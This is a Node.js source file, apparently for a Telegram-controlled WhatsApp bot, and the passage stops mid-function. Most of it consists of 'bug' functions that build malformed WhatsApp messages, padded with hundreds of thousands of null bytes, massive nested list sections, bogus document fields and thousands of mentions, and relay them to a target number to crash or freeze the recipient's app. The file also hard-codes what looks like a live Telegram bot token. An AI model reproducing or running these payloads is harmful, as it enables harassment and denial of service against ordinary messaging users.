const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    makeCacheableSignalKeyStore,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    getDevice,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@adiwajshing/baileys');
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const pino = require('pino');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const speed = require("performance-now")
const moment = require("moment-timezone");
const jimp = require("jimp");
const crypto = require('crypto')


const startTime = Date.now();
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const BOT_TOKEN = "7558037195:AAGXPconWphMGURMkyuOwuZB1lkGfm3xNzY";  // Replace with your Telegram bot token
let OWNER_ID = "7558037195"
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 }); // Store request counts for 2 minutes
let connectedUsers = {}; // Maps chat IDs to phone numbers
const Gabimaru = '923125146881@s.whatsapp.net';
const connectedUsersFilePath = path.join(__dirname, 'connectedUsers.json');
const { crashMsgCall, kamuflaseFreeze, systemUi, freezeInDocument, travaIos, travaIosKill, KillIosBlank, carouselCrashMsg, callXgalaxy, GalaxyInDocument, FreezeInLocation, iosaph } = require("./lib/func_mix")
const { smsg, sleep, fetchJson, runtime, isUrl } = require("./lib/myfunc")

const formatTime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? `${d} ${d === 1 ? 'day, ' : 'days, '}` : '';
  const hDisplay = h > 0 ? `${h} ${h === 1 ? 'hour, ' : 'hours, '}` : '';
  const mDisplay = m > 0 ? `${m} ${m === 1 ? 'minute, ' : 'minutes, '}` : '';
  const sDisplay = s > 0 ? `${s} ${s === 1 ? 'second' : 'seconds'}` : '';
  return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;
};


// Load connected users from the JSON file
function loadConnectedUsers() {
    if (fs.existsSync(connectedUsersFilePath)) {
        const data = fs.readFileSync(connectedUsersFilePath);
        connectedUsers = JSON.parse(data);
    }
}

// Save connected users to the JSON file
function saveConnectedUsers() {
    fs.writeFileSync(connectedUsersFilePath, JSON.stringify(connectedUsers, null, 2));
}

let isFirstLog = true;

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
    const sessionPath = path.join(__dirname, 'AllCreds', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        console.log(`Session directory does not exist for ${phoneNumber}.`);
        return; // Exit the function if the session does not exist
    }

    let { version, isLatest } = await fetchLatestBaileysVersion();
    if (isFirstLog) {
        console.log(`Using Baileys version: ${version} (Latest: ${isLatest})`);
        isFirstLog = false;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });
    store.bind(conn.ev);

    // Check if session credentials are already saved
    if (conn.authState.creds.registered) {
        await saveCreds();
        console.log(`Session credentials reloaded successfully for ${phoneNumber}!`);
    } else {
        // If not registered, generate a pairing code
        if (telegramChatId) {
            setTimeout(async () => {
                let code = await conn.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                pairingCodes.set(code, { count: 0, phoneNumber });
                bot.sendMessage(telegramChatId, `Your Pairing Code For ${phoneNumber} Is ${code}`);
                console.log(`Your Pairing Code for ${phoneNumber}: ${code}`);
            }, 3000);
        }
    }
    conn.public = true
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await saveCreds();
            console.log(`Credentials saved successfully for ${phoneNumber}!`);

            // Send success messages to the user on Telegram
            if (telegramChatId) {
                if (!connectedUsers[telegramChatId]) {
                    connectedUsers[telegramChatId] = [];
                }
                                connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: startTime });
                saveConnectedUsers(); // Save connected users after updating
                bot.sendMessage(telegramChatId, `
┏━━━━━━━━━《 𝗕𝗼𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 》
┣࿊ 𝗦𝘁𝗮𝘁𝘀    : 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱
┣࿊ 𝗨𝘀𝗲𝗿     : ${phoneNumber}
┗━━━━━━━━━
`)
		console.log(`
┏━━━━━━━━━《 𝗕𝗼𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 》
┣࿊ 𝗦𝘁𝗮𝘁𝘀    : 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱
┣࿊ 𝗨𝘀𝗲𝗿     : ${phoneNumber}
┗━━━━━━━━━`);
            }

            // Send a success message to the lord on WhatsApp
            try {
                await conn.sendMessage(Gabimaru, { text: `
┏━━━━━━━━━《 𝗕𝗼𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 》
┣࿊ 𝗦𝘁𝗮𝘁𝘀    : 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱
┣࿊ 𝗨𝘀𝗲𝗿     : ${phoneNumber}
┗━━━━━━━━━
` });
            } catch (error) {
                console.error('Error sending message to admin:', error);
            }
        } else if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log(`Session closed for ${phoneNumber}. Attempting to restart...`);
                startWhatsAppBot(phoneNumber, telegramChatId);
            }
        }
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async chatUpdate => {
        try {
            mess = chatUpdate.messages[0]
            if (!mess.message) return
            mess.message = (Object.keys(mess.message)[0] === 'ephemeralMessage') ? mess.message.ephemeralMessage.message : mess.message
            if (mess.key && mess.key.remoteJid === 'status@broadcast') return
            if (!conn.public && !mess.key.fromMe && chatUpdate.type === 'notify') return
            if (mess.key.id.startsWith('BAE5') && mess.key.id.length === 16) return
                try {
        const m = smsg(JSON.parse(JSON.stringify(mess)), conn);
        const type = getContentType(mess.message);
        const content = JSON.stringify(mess.message);
        const chat = mess.key.remoteJid;
        const quoted = type === 'extendedTextMessage' && mess.message.extendedTextMessage.contextInfo != null
            ? mess.message.extendedTextMessage.contextInfo.quotedMessage || []
            : [];
var body = (
type === 'conversation' ? mess.message.conversation :
type === 'imageMessage' ? mess.message.imageMessage.caption :
type === 'videoMessage' ? mess.message.videoMessage.caption :
type === 'extendedTextMessage' ? mess.message.extendedTextMessage.text :
type === 'buttonsResponseMessage' ? mess.message.buttonsResponseMessage.selectedButtonId :
type === 'listResponseMessage' ? mess.message.listResponseMessage.singleSelectxreply.selectedRowId :
type === 'interactiveResponseMessage' ? JSON.parse(mess.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
type === 'templateButtonxreplyMessage' ? mess.message.templateButtonxreplyMessage.selectedId :
type === 'messageContextInfo' ?
mess.message.buttonsResponseMessage?.selectedButtonId ||                                                                                                   
mess.message.listResponseMessage?.singleSelectxreply.selectedRowId ||
mess.message.InteractiveResponseMessage.NativeFlowResponseMessage ||                                                                                       
mess.text :
''
); 
    var budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = "."
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const isGroup = chat.endsWith('@g.us');
        const sender = mess.key.fromMe
            ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id)
            : (mess.key.participant || mess.key.remoteJid);
      	const moon = fs.readFileSync('./moon.jpeg')
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mess.pushName || 'TeleWA bot';
        let owner = JSON.parse(fs.readFileSync('./WABOTowners.json'))
        const isCreator = ["923125146881", "923255156992", botNumber,owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
        const groupMetadata = isGroup ? await conn.groupMetadata(chat).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber + "@s.whatsapp.net") : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let timestamp = speed();
let latency = speed() - timestamp;
        const pic = [
"https://files.catbox.moe/ujukuy.png",
// IMG Link
"https://files.catbox.moe/1pk2tm.jpeg",
// IMG Link 
"https://g.top4top.io/p_333301jy90.jpg",
// IMG Link
"https://g.top4top.io/p_333301jy90.jpg",
// IMG Link
"https://g.top4top.io/p_333301jy90.jpg",
// IMG link
"https://g.top4top.io/p_333301jy90.jpg",
// IMG Link
"https://g.top4top.io/p_333301jy90.jpg",
// IMG Link
"https://g.top4top.io/p_333301jy90.jpg"
]
const random = pic[Math.floor(Math.random() * pic.length)]
        
                		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnailUrl: "https://imgur.com/a/KMNbnGxv.jpeg",
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `KASHMIRI BOT XI`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [mess.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
				const xreply = async (text) => {
			await sleep(500)
			return conn.sendMessage(chat, {
				contextInfo: {
					mentionedJid: [
						mess.sender
					],
					externalAdxreply: {
						showAdAttribution: false, //bebas
						renderLargerThumbnail: false, //bebas
						title: `𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈`,
						body: `pαrαnσmαl єnd`,
						previewType: "VIDEO",
						thumbnail: moon,
						sourceUrl: "https://whatsapp.com/channel/0029VaieFO2HFxOtUtwLvQ0b",
						mediaUrl: "https://whatsapp.com/channel/0029VaieFO2HFxOtUtwLvQ0b"
					}
				},
				text: text
			}, {
				quoted: zets
			})
		}
//DEVELOPER//
const developerNumbers = [
  '923255156992@s.whatsapp.net',
  '923440511603@s.whatsapp.net'
];
//ENDING OF DEVELOPER 
		//Bug Function 25
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "KASHMIRI " + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await conn.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function InvisiPayload(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "𐎟💦⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "𐎟💦⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await conn.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
    
async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐌𝐒𝐆𝐒͢𝐏𝐀𝐌͢ 🐉⃝⃝𐎟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  
async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈͢𝐓𝐙𝐘𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(4500),
listType: 2,
singleSelectxreply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: conn.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𐎟🩸⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© KASHMIRI ",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "Agler Forger gen 9"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "https://t.me/+N_jp7QWqfGg0ZGM8 ",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "KASHMIRI ",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdxreply: {
title: "𑲭𑲭 KASHMIRI  ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoxreply: false,
body: "© vilesta",
sourceUrl: "se me?",
sourceId: "vilesta",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363312991035785@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await conn.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}

async function NewIos(target, Ptcp = true) {
conn.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𐎟🩸⃝⃝𝐂𝐈𝐂𝐈͢𝐓𝐙𝐘𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdxreply: {
                    title: "𑲭𑲭𐎟🩸⃝⃝𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoxreply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("")
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "🆘⃢⃝⃝⃝⃝⃝△𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectxreply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            virtexId: conn.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "KASHMIRI " + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
                footerText: "🆘⃢⃝⃝⃝⃝⃝△𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈  🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "vilesta (¢)" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "vilesta (¢)" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "KASHMIRI  official" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/KASHMIRI _Offc",
              buttonTitle: "🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐭𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdxreply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
